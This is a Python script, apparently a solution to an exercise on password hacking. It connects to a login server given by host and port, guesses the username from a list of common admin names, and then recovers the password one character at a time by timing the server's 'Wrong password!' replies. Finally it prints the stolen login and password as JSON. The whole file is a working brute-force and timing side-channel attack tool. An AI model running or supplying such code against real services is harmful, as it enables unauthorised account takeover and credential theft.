import socket
import sys
import string
import itertools
import json
from datetime import datetime
symbols=string.ascii_letters+string.digits
difference=0
logins=['admin\n', 'Admin\n', 'admin1\n', 'admin2\n', 'admin3\n', 'user1\n', 'user2\n', 'root\n', 'default\n', 'new_user\n', 'some_user\n', 'new_admin\n', 'administrator\n', 'Administrator\n', 'superuser\n', 'super\n', 'su\n', 'alex\n', 'suser\n', 'rootuser\n', 'adminadmin\n', 'useruser\n', 'superadmin\n', 'username\n', 'username1\n']
def credentials(admin,password,sock):
    cred={"login": admin,"password": password}
    json_cred=json.dumps(cred)
    sock.send(json_cred.encode())
    response=sock.recv(1024)
    return json.loads(response.decode())



args=sys.argv
with socket.socket() as client_socket:
   client_socket.connect((args[1], int(args[2])))
   adminn=""
   for value in range (len(logins)):
         adminn=logins[value].strip("\n")
         start=datetime.now()
         reply=credentials(adminn," ",client_socket)
         finish=datetime.now()
         if(reply['result']== "Wrong password!"):
             difference=finish-start
             admin_found=adminn
             break
   password=""
   passwordfound=""
   success=False
   while not success:
        for char in (symbols):
           start=datetime.now()
           check=credentials(admin_found,password+char,client_socket)
           finish=datetime.now()

           if(check['result']=="Connection success!"):
               password=password+char
               passwordfound=password
               success=True
               break
           elif(check['result']=="Wrong password!"):
               if((finish-start).microseconds>=90000):
                   password=password+char
                   break



   credits={"login" : admin_found,"password": passwordfound}
   print(json.dumps(credits,indent=1))












